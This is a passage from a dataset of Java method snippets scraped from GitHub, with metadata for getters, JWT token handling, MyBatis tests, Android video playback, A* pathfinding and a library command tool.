"url": "https://raw.githubusercontent.com/aiqfome/aiqInput/master/aiqinput/src/main/java/com/aiqfome/aiqinput/IconSubTitleItem.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30362, "method_name": "getTitle", "class_name": "IconSubTitleItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTitle() {\n        return title;\n    }", "url": "https://raw.githubusercontent.com/aiqfome/aiqInput/master/aiqinput/src/main/java/com/aiqfome/aiqinput/IconSubTitleItem.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30363, "method_name": "getIcon", "class_name": "IconSubTitleItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Drawable", "snippet": "    public Drawable getIcon() {\n        return icon;\n    }", "url": "https://raw.githubusercontent.com/aiqfome/aiqInput/master/aiqinput/src/main/java/com/aiqfome/aiqinput/IconSubTitleItem.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30364, "method_name": "getSubTitle", "class_name": "IconSubTitleItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSubTitle() {\n        return subTitle != null ? subTitle : \"\";\n    }", "url": "https://raw.githubusercontent.com/aiqfome/aiqInput/master/aiqinput/src/main/java/com/aiqfome/aiqinput/IconSubTitleItem.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30365, "method_name": "top", "class_name": "JetTemplateMethod", "params": ["List<PageFile>", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<PageFile>", "snippet": "    public static List<PageFile> top(List<PageFile> pageFiles, int number) {\n        return pageFiles.subList(0, number);\n    }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/template/JetTemplateMethod.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30366, "method_name": "groupBy", "class_name": "JetTemplateMethod", "params": ["List<Page>", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "TreeMap<String,List>", "snippet": "    public static TreeMap<String, List<Page>> groupBy(List<Page> pages, String type) {\n        var dateFormat = \"yyyy\";\n        if (type.trim().equals(\"month\")) {\n            dateFormat = \"yyyy-MM\";\n        }\n        String finalDateFormat = dateFormat;\n\n        Map<String, List<Page>> map = pages.stream()\n                .collect(Collectors.groupingBy(page -> DateUtil.format(page.getDate(), finalDateFormat)));\n        return MapUtil.sort(map, Comparator.reverseOrder());\n    }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/template/JetTemplateMethod.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30367, "method_name": "main", "class_name": "VisitorTest", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        MuseumObjectStructure museumObjectStructure = new MuseumObjectStructure();\n\n        Mural mural = new Mural();\n        mural.setName(\"\u58c1\u753b\");\n        JadeArticle jadeArticle = new JadeArticle();\n        jadeArticle.setName(\"\u7389\u5668\");\n\n        museumObjectStructure.add(mural);\n        museumObjectStructure.add(jadeArticle);\n\n        Visitor chineseVisitor=new ChineseVisitor();\n        museumObjectStructure.accept(chineseVisitor);\n        System.out.println(\"------------------------\");\n        Visitor foreignVisitor = new ForeignVisitor();\n        museumObjectStructure.accept(foreignVisitor);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/visitor/VisitorTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30368, "method_name": "afterPropertiesSet", "class_name": "TokenProvider", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void afterPropertiesSet() {\n        byte[] keyBytes;\n        String secret = jHipsterProperties.getSecurity().getAuthentication().getJwt().getSecret();\n        if (!StringUtils.isEmpty(secret)) {\n            log.warn(\"Warning: the JWT key used is not Base64-encoded. \" +\n                \"We recommend using the `jhipster.security.authentication.jwt.base64-secret` key for optimum security.\");\n            keyBytes = secret.getBytes(StandardCharsets.UTF_8);\n        } else {\n            log.debug(\"Using a Base64-encoded JWT secret key\");\n            keyBytes = Decoders.BASE64.decode(jHipsterProperties.getSecurity().getAuthentication().getJwt().getBase64Secret());\n        }\n        this.key = Keys.hmacShaKeyFor(keyBytes);\n        this.tokenValidityInMilliseconds =\n            1000 * jHipsterProperties.getSecurity().getAuthentication().getJwt().getTokenValidityInSeconds();\n        this.tokenValidityInMillisecondsForRememberMe =\n            1000 * jHipsterProperties.getSecurity().getAuthentication().getJwt()\n                .getTokenValidityInSecondsForRememberMe();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/security/jwt/TokenProvider.java", "stars": "2", "class_props": {"extends": null, "implements": ["InitializingBean"], "modifiers": ["public"]}}, {"id": 30369, "method_name": "createToken", "class_name": "TokenProvider", "params": ["Authentication", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String createToken(Authentication authentication, boolean rememberMe) {\n        String authorities = authentication.getAuthorities().stream()\n            .map(GrantedAuthority::getAuthority)\n            .collect(Collectors.joining(\",\"));\n\n        long now = (new Date()).getTime();\n        Date validity;\n        if (rememberMe) {\n            validity = new Date(now + this.tokenValidityInMillisecondsForRememberMe);\n        } else {\n            validity = new Date(now + this.tokenValidityInMilliseconds);\n        }\n\n        return Jwts.builder()\n            .setSubject(authentication.getName())\n            .claim(AUTHORITIES_KEY, authorities)\n            .signWith(key, SignatureAlgorithm.HS512)\n            .setExpiration(validity)\n            .compact();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/security/jwt/TokenProvider.java", "stars": "2", "class_props": {"extends": null, "implements": ["InitializingBean"], "modifiers": ["public"]}}, {"id": 30370, "method_name": "getAuthentication", "class_name": "TokenProvider", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Authentication", "snippet": "    public Authentication getAuthentication(String token) {\n        Claims claims = Jwts.parser()\n            .setSigningKey(key)\n            .parseClaimsJws(token)\n            .getBody();\n\n        Collection<? extends GrantedAuthority> authorities =\n            Arrays.stream(claims.get(AUTHORITIES_KEY).toString().split(\",\"))\n                .map(SimpleGrantedAuthority::new)\n                .collect(Collectors.toList());\n\n        User principal = new User(claims.getSubject(), \"\", authorities);\n\n        return new UsernamePasswordAuthenticationToken(principal, token, authorities);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/security/jwt/TokenProvider.java", "stars": "2", "class_props": {"extends": null, "implements": ["InitializingBean"], "modifiers": ["public"]}}, {"id": 30371, "method_name": "validateToken", "class_name": "TokenProvider", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean validateToken(String authToken) {\n        try {\n            Jwts.parser().setSigningKey(key).parseClaimsJws(authToken);\n            return true;\n        } catch (JwtException | IllegalArgumentException e) {\n            log.info(\"Invalid JWT token.\");\n            log.trace(\"Invalid JWT token trace.\", e);\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/security/jwt/TokenProvider.java", "stars": "2", "class_props": {"extends": null, "implements": ["InitializingBean"], "modifiers": ["public"]}}, {"id": 30372, "method_name": "setup", "class_name": "AutodiscoverTest", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setup() throws Exception {\n    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/autodiscover/MapperConfig.xml\")) {\n      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/autodiscover/AutodiscoverTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30373, "method_name": "testTypeAlias", "class_name": "AutodiscoverTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testTypeAlias() {\n    TypeAliasRegistry typeAliasRegistry = sqlSessionFactory.getConfiguration().getTypeAliasRegistry();\n    typeAliasRegistry.resolveAlias(\"testAlias\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/autodiscover/AutodiscoverTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30374, "method_name": "testTypeHandler", "class_name": "AutodiscoverTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testTypeHandler() {\n    TypeHandlerRegistry typeHandlerRegistry = sqlSessionFactory.getConfiguration().getTypeHandlerRegistry();\n    assertTrue(typeHandlerRegistry.hasTypeHandler(BigInteger.class));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/autodiscover/AutodiscoverTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30375, "method_name": "testMapper", "class_name": "AutodiscoverTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testMapper() {\n    assertTrue(sqlSessionFactory.getConfiguration().hasMapper(DummyMapper.class));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/autodiscover/AutodiscoverTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30376, "method_name": "getMediaPlayer", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "IMediaPlayer", "snippet": "    public IMediaPlayer getMediaPlayer() {\n        return mediaPlayer;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30377, "method_name": "initVideoPlayer", "class_name": "SystemPlayerManager", "params": ["Context", "Message", "List<VideoOptionModel>", "ICacheManager"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initVideoPlayer(Context context, Message msg, List<VideoOptionModel> optionModelList, ICacheManager cacheManager) {\n        this.context = context.getApplicationContext();\n        mediaPlayer = new AndroidMediaPlayer();\n        mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);\n        release = false;\n        GSYModel gsyModel = (GSYModel) msg.obj;\n        try {\n            if (gsyModel.isCache() && cacheManager != null) {\n                cacheManager.doCacheLogic(context, mediaPlayer, gsyModel.getUrl(), gsyModel.getMapHeadData(), gsyModel.getCachePath());\n            } else {\n                mediaPlayer.setDataSource(context, Uri.parse(gsyModel.getUrl()), gsyModel.getMapHeadData());\n            }\n            mediaPlayer.setLooping(gsyModel.isLooping());\n            if (gsyModel.getSpeed() != 1 && gsyModel.getSpeed() > 0) {\n                setSpeed(gsyModel.getSpeed());\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        initSuccess(gsyModel);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30378, "method_name": "showDisplay", "class_name": "SystemPlayerManager", "params": ["Message"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showDisplay(Message msg) {\n        if (msg.obj == null && mediaPlayer != null && !release) {\n            mediaPlayer.setSurface(null);\n        } else if (msg.obj != null) {\n            Surface holder = (Surface) msg.obj;\n            surface = holder;\n            if (mediaPlayer != null && holder.isValid() && !release) {\n                mediaPlayer.setSurface(holder);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30379, "method_name": "setSpeed", "class_name": "SystemPlayerManager", "params": ["float", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSpeed(float speed, boolean soundTouch) {\n        setSpeed(speed);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30380, "method_name": "setNeedMute", "class_name": "SystemPlayerManager", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNeedMute(boolean needMute) {\n        try {\n            if (mediaPlayer != null && !release) {\n                if (needMute) {\n                    mediaPlayer.setVolume(0, 0);\n                } else {\n                    mediaPlayer.setVolume(1, 1);\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30381, "method_name": "releaseSurface", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void releaseSurface() {\n        if (surface != null) {\n            //surface.release();\n            surface = null;\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30382, "method_name": "release", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void release() {\n        if (mediaPlayer != null) {\n            release = true;\n            mediaPlayer.release();\n        }\n        lastTotalRxBytes = 0;\n        lastTimeStamp = 0;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30383, "method_name": "getBufferedPercentage", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getBufferedPercentage() {\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30384, "method_name": "getNetSpeed", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getNetSpeed() {\n        if (mediaPlayer != null) {\n            return getNetSpeed(context);\n        }\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30385, "method_name": "setSpeedPlaying", "class_name": "SystemPlayerManager", "params": ["float", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSpeedPlaying(float speed, boolean soundTouch) {\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30386, "method_name": "start", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void start() {\n        if (mediaPlayer != null) {\n            mediaPlayer.start();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30387, "method_name": "stop", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void stop() {\n        if (mediaPlayer != null) {\n            mediaPlayer.stop();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30388, "method_name": "pause", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pause() {\n        if (mediaPlayer != null) {\n            mediaPlayer.pause();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30389, "method_name": "getVideoWidth", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoWidth() {\n        if (mediaPlayer != null) {\n            return mediaPlayer.getVideoWidth();\n        }\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30390, "method_name": "getVideoHeight", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoHeight() {\n        if (mediaPlayer != null) {\n            return mediaPlayer.getVideoHeight();\n        }\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30391, "method_name": "isPlaying", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isPlaying() {\n        if (mediaPlayer != null) {\n            return mediaPlayer.isPlaying();\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30392, "method_name": "seekTo", "class_name": "SystemPlayerManager", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void seekTo(long time) {\n        if (mediaPlayer != null) {\n            mediaPlayer.seekTo(time);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30393, "method_name": "getCurrentPosition", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getCurrentPosition() {\n        if (mediaPlayer != null) {\n            return mediaPlayer.getCurrentPosition();\n        }\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30394, "method_name": "getDuration", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getDuration() {\n        if (mediaPlayer != null) {\n            return mediaPlayer.getDuration();\n        }\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30395, "method_name": "getVideoSarNum", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoSarNum() {\n        if (mediaPlayer != null) {\n            return mediaPlayer.getVideoSarNum();\n        }\n        return 1;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30396, "method_name": "getVideoSarDen", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoSarDen() {\n        if (mediaPlayer != null) {\n            return mediaPlayer.getVideoSarDen();\n        }\n        return 1;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30397, "method_name": "isSurfaceSupportLockCanvas", "class_name": "SystemPlayerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isSurfaceSupportLockCanvas() {\n        return false;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30398, "method_name": "setSpeed", "class_name": "SystemPlayerManager", "params": ["float"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setSpeed(float speed) {\n        if (release) {\n            return;\n        }\n        if (mediaPlayer != null && mediaPlayer.getInternalMediaPlayer() != null && mediaPlayer.isPlayable()) {\n            try {\n                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {\n                    PlaybackParams playbackParams = new PlaybackParams();\n                    playbackParams.setSpeed(speed);\n                    mediaPlayer.getInternalMediaPlayer().setPlaybackParams(playbackParams);\n                } else {\n                    Debuger.printfError(\" not support setSpeed\");\n                }\n            } catch (Exception e){\n                e.printStackTrace();\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30399, "method_name": "getNetSpeed", "class_name": "SystemPlayerManager", "params": ["Context"], "throws": null, "modifiers": ["private"], "return_type": "long", "snippet": "    private long getNetSpeed(Context context) {\n        if (context == null) {\n            return 0;\n        }\n        long nowTotalRxBytes = TrafficStats.getUidRxBytes(context.getApplicationInfo().uid) == TrafficStats.UNSUPPORTED ? 0 : (TrafficStats.getTotalRxBytes() / 1024);//\u8f6c\u4e3aKB\n        long nowTimeStamp = System.currentTimeMillis();\n        long calculationTime = (nowTimeStamp - lastTimeStamp);\n        if (calculationTime == 0) {\n            return calculationTime;\n        }\n        //\u6beb\u79d2\u8f6c\u6362\n        long speed = ((nowTotalRxBytes - lastTotalRxBytes) * 1000 / calculationTime);\n        lastTimeStamp = nowTimeStamp;\n        lastTotalRxBytes = nowTotalRxBytes;\n        return speed;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/player/SystemPlayerManager.java", "stars": "2", "class_props": {"extends": "BasePlayerManager", "implements": null, "modifiers": ["public"]}}, {"id": 30400, "method_name": "find", "class_name": "AStar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<PathItem>", "snippet": "    public List<PathItem> find() {\n        PathItem item = getPathItemLinkedList();\n        path.clear();\n        if (item != null) {\n            calculatePath(item);\n        }\n        return path;\n    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/pathfinder/AStar.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30401, "method_name": "calculatePath", "class_name": "AStar", "params": ["PathItem"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void calculatePath(PathItem item) {\n        PathItem i = item;\n        while (i != null) {\n            path.add(0, i);\n            i = i.precedent;\n        }\n    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/pathfinder/AStar.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30402, "method_name": "getPathItemLinkedList", "class_name": "AStar", "params": [], "throws": null, "modifiers": [], "return_type": "PathItem", "snippet": "    PathItem getPathItemLinkedList() {\n        PathItem root = new PathItem();\n        root.coord = this.from;\n        openList.add(root);\n\n        while (openList.size() > 0) {\n            PathItem visiting = openList.remove(); // imagine it's the best\n            Coord visitingCoord = visiting.coord;\n\n            if (visitingCoord.equals(target)) {\n                return visiting;\n            }\n            if (closedList.containsKey(visitingCoord)) {\n                continue;\n            }\n            closedList.put(visitingCoord, visiting);\n\n            List<Coord> neighbors = grid.getNeighbours(visitingCoord);\n            for (Coord neighbor : neighbors) {\n                if (grid.get(neighbor).getType() == CellType.FLOOR) {\n                    addToOpenList(visiting, visitingCoord, neighbor);\n                }\n            }\n\n            if (grid.calculateDistance(visitingCoord, target) < grid.calculateDistance(nearest, target)) {\n                this.nearest = visitingCoord;\n            }\n        }\n        return null; // not found !\n    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/pathfinder/AStar.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30403, "method_name": "addToOpenList", "class_name": "AStar", "params": ["PathItem", "Coord", "Coord"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void addToOpenList(PathItem visiting, Coord fromCoord, Coord toCoord) {\n        if (closedList.containsKey(toCoord)) {\n            return;\n        }\n        PathItem pi = new PathItem();\n        pi.coord = toCoord;\n        pi.cumulativeLength = visiting.cumulativeLength + weightFunction.apply(toCoord);\n        int manh = grid.calculateDistance(fromCoord, toCoord);\n        pi.totalPrevisionalLength = pi.cumulativeLength + manh;\n        pi.precedent = visiting;\n        openList.add(pi);\n    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/pathfinder/AStar.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30404, "method_name": "getNearest", "class_name": "AStar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Coord", "snippet": "    public Coord getNearest() {\n        return nearest;\n    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/pathfinder/AStar.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30405, "method_name": "getShader", "class_name": "NoEffect", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getShader(GLSurfaceView mGlSurfaceView) {\n\n        String shader = \"#extension GL_OES_EGL_image_external : require\\n\"\n                + \"precision mediump float;\\n\"\n                + \"varying vec2 vTextureCoord;\\n\"\n                + \"uniform samplerExternalOES sTexture;\\n\" + \"void main() {\\n\"\n                + \"  gl_FragColor = texture2D(sTexture, vTextureCoord);\\n\"\n                + \"}\\n\";\n\n        return shader;\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/effect/NoEffect.java", "stars": "2", "class_props": {"extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"id": 30406, "method_name": "execute", "class_name": "ListCmd", "params": ["LibraryData"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void execute(LibraryData data) {\n        Objects.requireNonNull(data, LegalityCheck.LIBRARY_DATA_NULL_MESSAGE);\n\n        List<BookEntry> bookData = data.getBookData();\n        if (bookData.isEmpty()) {\n            System.out.println(\"The library has no book entries.\");\n            return;\n        }\n        System.out.println(bookData.size() + \" books in library:\");\n\n        for (BookEntry book : bookData) {\n            if (this.savedOption == ListCommandOptions.SHORT) {\n                System.out.println(book.getTitle());\n            }\n            if (this.savedOption == ListCommandOptions.LONG) {\n                // Print title\n                System.out.println(book.toString());\n                System.out.println();\n            }\n        }\n        System.out.println();\n    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/src/ListCmd.java", "stars": "6", "class_props": {"extends": "LibraryCommand", "implements": null, "modifiers": ["public"]}}, {"id": 30407, "method_name": "parseArguments", "class_name": "ListCmd", "params": ["String"], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean parseArguments(String argumentInput) {\n        Objects.requireNonNull(argumentInput, LegalityCheck.INPUT_ARGUMENT_NULL_MESSAGE);\n\n        switch (argumentInput) {\n\n            case LIST_COMMAND_OPTION_EMPTY:\n            case 